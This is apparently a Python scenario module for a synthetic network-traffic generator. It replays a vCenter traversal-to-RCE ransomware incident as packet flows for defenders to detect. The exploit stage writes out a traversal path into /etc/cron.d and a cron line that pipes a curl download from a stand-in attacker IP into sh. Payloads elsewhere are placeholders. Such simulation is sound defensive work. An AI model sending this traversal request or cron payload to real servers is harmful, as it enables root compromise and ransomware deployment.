"""netgen.vcenter59310 -- the "VMware vCenter CVE-2026-59310" incident-replay scenario.

A replay of the VMware vCenter Server Syslog-service directory-traversal -> root RCE zero-day
(CVE-2026-59310, CVSS 9.8; exploited in the wild, CISA KEV; China-nexus + Babuk-derived ransomware
on ESXi). The traversal writes a cron file into /etc/cron.d to run as root, the attacker deploys
reverse SSH for persistence, and uses vCenter to push the ransomware onto the ESXi hosts it manages.

Modelled as a selectable scenario (``ir-vcenter-cve59310``, category IR), a SIBLING package to the
other IR replays. Three hosts are injected at runtime -- the vCenter Server (EXL-VC1) and two ESXi
hypervisor hosts it manages (EXL-ESXI1/2) -- so the capture shows the full chain: the inbound
traversal exploit, the outbound reverse SSH + C2 from vCenter, and vCenter driving the ESXi
management ports to deploy the ransomware.

RFC 791 / network-observable: real IPv4 datagrams (RFC 1918 estate + RFC 5737 external actors). The
HTTPS legs carry a real key-logged TLS 1.3 handshake with the HTTP as cleartext in the record
(decrypts with the exported keys); the reverse-SSH handshake and the ESXi :902 agent control flow
are observable on the wire.

PIN-SAFE: every host is injected into ``ctx.h`` INSIDE ``build()``; a build that does not select
this scenario is byte-for-byte the baseline.
"""
import os

from netgen import flows as F
from netgen.identity import H, get_current
from netgen import protocols as P
from netgen.core import Host

from netgen.netscaler import phases as NSP
from netgen.netscaler.phases import _https_open, _http_req, _https_msg
from netgen.netscaler import _host
from netgen.netscaler import content

rng = NSP.rng

_VC_SUFFIX, _VC_IP = "VC1", "10.10.20.59"            # VMware vCenter Server appliance
_VC_MAC = "00:50:56:bb:08:4e"
_ESXI = [("ESXI1", "10.10.20.65", "00:50:56:bb:08:65"), ("ESXI2", "10.10.20.66", "00:50:56:bb:08:66")]
_EXTERNAL = {
    "attacker": ("node59.probe-pool.example", "203.0.113.59", 12),   # offender + reverse-SSH sink
    "beacon":   ("sync.vc-telemetry.example",  "192.0.2.60", 13),    # TCP 8443 beacon sink
    "exfil":    ("cdn-vmware-updates.com",     "192.0.2.61", 15),    # HTTPS exfil sink (inventory)
    # own benign-workforce identities (shared defect #28): see metabase72898's comment.
    "wfA": ("host-a.vc-telemetry.example", "198.51.100.61", 7),
    "wfB": ("host-b.vc-telemetry.example", "198.51.100.62", 7),
    "wfC": ("host-c.vc-telemetry.example", "198.51.100.63", 7),
    "wfD": ("host-d.vc-telemetry.example", "198.51.100.64", 7),
}
_UA = "python-urllib3/2.2"


def _inject_hosts(ctx):
    """Add the vCenter Server, the managed ESXi hosts, and the external actors. Pin-safe."""
    domain = P.DOMAIN
    vc_name = _host(ctx, _VC_SUFFIX)
    if vc_name not in ctx.h:
        ctx.h[vc_name] = Host(vc_name, ctx.link.place(_VC_IP), _VC_MAC, "https",
                              "VMware vCenter Server appliance", ctx.link.server_net, "vcenter." + domain)
    for suf, ip, mac in _ESXI:
        name = _host(ctx, suf)
        if name not in ctx.h:
            ctx.h[name] = Host(name, ctx.link.place(ip), mac, "https", "VMware ESXi hypervisor host",
                               ctx.link.server_net, suf.lower() + "." + domain)
    cache = ctx.__dict__.setdefault("_vc_ext", {})
    for key, (fqdn, ip, hops) in _EXTERNAL.items():
        if key not in cache:
            h = Host(fqdn.split(".")[0].upper(), ip,
                     "02:00:5e:%02x:%02x:%02x" % (rng.randrange(256), rng.randrange(256), rng.randrange(256)),
                     "linux", "external", ip.rsplit(".", 1)[0] + ".0/24", fqdn)
            h.hops = hops
            cache[key] = h
    return cache


def vc_exploit(ctx, atk, vc, ts=None):
    """Stage 1 -- CVE-2026-59310: a directory-traversal request to the vCenter Syslog service writes
    a cron file into /etc/cron.d (root RCE). The traversal path and the cron body are cleartext in
    the TLS record."""
    host = "%s:443" % vc.ip
    s = _https_open(ctx, atk, vc, ts, "chrome", sni=None, vantage=vc)
    trav = "/sdk/vimServiceVersions.xml/../../../../../../../etc/cron.d/vmsyslog-collector"
    req = _http_req("POST", trav, host, _UA, extra=["Content-Type: application/octet-stream"],
                    body=b"* * * * * root /bin/sh -c 'curl -s http://203.0.113.59/x | sh'\n")
    _https_msg(s, req, P.http_response("200 OK", b"", "text/plain", s.t, server="VMware"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def cron_fetch(ctx, vc, atk, ts=None):
    """What the planted cron line causes: a plain HTTP GET of /x on port 80, once a minute, from
    the moment the cron file lands (brief fix 1)."""
    out = ctx.arp_for(vc, atk, ts, vantage=vc)
    s = ctx.tcp(vc, atk, 80, ts + 0.001, vantage=vc).handshake()
    s.c2s(_http_req("GET", "/x", "%s:80" % atk.ip, "curl/7.81.0"), think=0.01)
    s.s2c(P.http_response("200 OK", b"", "text/plain", s.t, server="nginx"), think=rng.uniform(0.02, 0.1))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.02, 0.1)))


def vc_reverse_ssh(ctx, vc, atk, ts=None):
    """Stage 2a -- reverse SSH persistence: vCenter dials OUT to the attacker on :22 (framed on the
    server segment so the sensor sees the egress). Exact OpenSSH KEXINIT -> HASSH."""
    return NSP._ssh_flow(ctx, vc, atk, ts, rng.uniform(42.0, 55.0), vantage=vc)


_SOAP_NS = "urn:vim25"
_SOAP_ENV = ("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
            "xmlns:vim25=\"%s\"><soapenv:Body>%%s</soapenv:Body></soapenv:Envelope>" % _SOAP_NS)


def _vim25_login_resp(n):
    body = _SOAP_ENV % ("<vim25:LoginResponse><returnval><fullName>root</fullName>"
                        "<key>vmware-session-%s</key></returnval></vim25:LoginResponse>"
                        % "".join("%02x" % b for b in range(16)))
    return content.fit(body, n)


def esxi_deploy(ctx, vc, esxi, ts=None):
    """Stage 3 -- vCenter drives a managed ESXi host: a vim25 SOAP login then a datastore file
    upload (the ransomware push) as an HTTPS PUT to /folder/..., followed by a burst on the ESXi
    agent port :902 (opaque, vCenter-agent-shaped -- the burst still carries no real payload:
    volume and direction are the signal, not the content)."""
    host = "%s:443" % esxi.ip
    s = _https_open(ctx, vc, esxi, ts, "chrome", sni=esxi.fqdn, vantage=esxi)
    login_req = _http_req("POST", "/sdk", host, "VMware vim-sdk/8.0",
                          extra=["Content-Type: text/xml; charset=utf-8", "SOAPAction: \"%s\"" % _SOAP_NS],
                          body=(_SOAP_ENV % "<vim25:Login><_this type=\"SessionManager\">SessionManager</_this>"
                                "<userName>root</userName></vim25:Login>").encode())
    _https_msg(s, login_req, P.http_response("200 OK", _vim25_login_resp(680), "text/xml", s.t, server="VMware"))
    put_req = _http_req("PUT", "/folder/enc.sh?dcPath=ha-datacenter&dsName=datastore1", host, "VMware vim-sdk/8.0",
                        extra=["Content-Type: application/octet-stream"], body=content.pem_blob("ENCRYPTOR PAYLOAD", 1024, esxi.fqdn))
    _https_msg(s, put_req, P.http_response("200 OK", b"", "text/plain", s.t, server="VMware"))
    api = F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))
    out = ctx.arp_for(vc, esxi, ts + 0.5, vantage=esxi)
    a = ctx.tcp(vc, esxi, 902, ts + 0.501, vantage=esxi).handshake()
    a.c2s(os.urandom(220), think=0.01)
    a.s2c(os.urandom(64), think=0.02)
    for _ in range(8):                                   # the encryptor push + control
        a.c2s(os.urandom(rng.randint(400, 1400)), think=rng.uniform(0.01, 0.08))
        a.s2c(os.urandom(rng.randint(40, 200)), think=rng.uniform(0.01, 0.05))
    agent = F.merged(out, a.close(by_client=True, think=rng.uniform(0.05, 0.3)))
    return F.merged(api, agent)


def mgmt_heartbeat(ctx, vc, esxi, ts=None):
    """Baseline management plane: a small SDK status poll (:443) and an agent heartbeat (:902)
    between vCenter and one ESXi host -- the constant traffic the attack stage is a deviation
    from (brief fix 3)."""
    host = "%s:443" % esxi.ip
    s = _https_open(ctx, vc, esxi, ts, "chrome", sni=esxi.fqdn, vantage=esxi)
    req = _http_req("POST", "/sdk", host, "VMware vim-sdk/8.0",
                    extra=["Content-Type: text/xml; charset=utf-8", "SOAPAction: \"%s\"" % _SOAP_NS],
                    body=(_SOAP_ENV % "<vim25:CurrentTime><_this type=\"ServiceInstance\">ServiceInstance</_this></vim25:CurrentTime>").encode())
    _https_msg(s, req, P.http_response("200 OK", content.xml_doc("currentTime", 140, esxi.fqdn), "text/xml", s.t, server="VMware"))
    api = F.merged(s._ns_pre, s.close(think=rng.uniform(0.02, 0.1)))
    out = ctx.arp_for(vc, esxi, ts + 0.3, vantage=esxi)
    a = ctx.tcp(vc, esxi, 902, ts + 0.301, vantage=esxi).handshake()
    a.c2s(os.urandom(24), think=0.005)
    a.s2c(os.urandom(24), think=0.01)
    hb = F.merged(out, a.close(by_client=True, think=rng.uniform(0.02, 0.1)))
    return F.merged(api, hb)


def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-59310 incident: syslog-service traversal -> cron RCE -> reverse SSH +
    C2 beacon + first-seen C2 DNS -> VM-inventory exfil -> vCenter deploys the ESXi ransomware
    (443 API + 902 agent, every host). Signature-critical records always emitted; beacon cadence and
    benign volume scale with ctx.scale. Registered as ``ir-vcenter-cve59310`` (imported lazily)."""
    ext = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))

    def at(offset):
        return lo + offset

    vc = ctx.h[_host(ctx, _VC_SUFFIX)]
    esxis = [ctx.h[_host(ctx, suf)] for suf, _ip, _mac in _ESXI if _host(ctx, suf) in ctx.h]
    dc1 = ctx.h.get(_host(ctx, "DC1"))
    atk, beacon, exfil = ext["attacker"], ext["beacon"], ext["exfil"]

    # ---- Stage 1: syslog-service traversal -> cron RCE -------------------------------------
    s(at(22), vc_exploit, atk, vc)
    # the cron line fires once a minute from the moment it lands
    t = at(82)
    while t < hi:
        s(t, cron_fetch, vc, atk)
        t += 60

    # ---- baseline management plane: vCenter <-> each ESXi host, so the attack stage is a
    # deviation from constant traffic, not the only vCenter-to-ESXi traffic in the window -----
    for esxi in esxis:
        t = lo + rng.uniform(0, 60)
        while t < hi:
            s(t, mgmt_heartbeat, vc, esxi)
            t += rng.uniform(55, 65)
        tn = lo + rng.uniform(0, 300)
        while tn < hi:
            s(tn, F.ntp_exchange, esxi)
            tn += rng.uniform(280, 320)

    # ---- Stage 2: reverse SSH + C2 beacon + first-seen C2 DNS ------------------------------
    s(at(140), vc_reverse_ssh, vc, atk)
    s(at(2600), vc_reverse_ssh, vc, atk)
    if dc1 is not None:
        s(at(300), NSP.c2_dns, vc, dc1, "sync.vc-telemetry.example")
        s(at(560), NSP.c2_dns, vc, dc1, "cdn-vmware-updates.com")
    t, counter = at(360), 1
    while t < hi:
        s(t, NSP.c2_beacon, vc, beacon, counter)
        counter += 1
        t += rng.uniform(60, 100)

    # ---- Stage 2b: VM-inventory exfil (cleartext HTTP PUT) ---------------------------------
    body = ("vCenter inventory export\n" + "\n".join(
        "vm=%d name=prod-%04d host=%sESXI%d datastore=SAN-01" % (i, i, get_current().prefix, 1 + i % 2) for i in range(1, 260))).encode()
    s(at(620), NSP.config_exfil, vc, exfil, body, path="/staging/vm_inventory.json")
    # Bulk data exfil -- the HIGH-volume stage (tens of MB): the VM inventory / datastore listing
    # staged out to the exfil sink, distinct from the ~KB config PUT and the hundreds-of-bytes beacons.
    s(at(660), NSP.data_exfil, vc, exfil, int(18_000_000 * scale), label="vm-inventory.tar")

    # ---- Stage 3: vCenter deploys the ransomware to every managed ESXi host ----------------
    for i, esxi in enumerate(esxis):
        s(at(1600 + i * 90), esxi_deploy, vc, esxi)
        s(at(2000 + i * 90), esxi_deploy, vc, esxi)
    # NOTE: no visible encryption stage beyond the datastore push above -- the page should say so
    # if a ransom-note write or further datastore I/O is meant to be observable (owner decision).

    # ---- benign interleave: normal vSphere Client traffic to vCenter -----------------------
    for label in ("A", "B", "C", "D"):
        visits = max(2, int(round(8 * scale)))
        for _ in range(visits):
            client = ext[{"A": "wfA", "B": "wfB", "C": "wfC", "D": "wfD"}[label]]
            s(lo + rng.uniform(0, max(1.0, hi - lo - 60)), NSP.portal_browse, client, vc, label, product="vcenter")
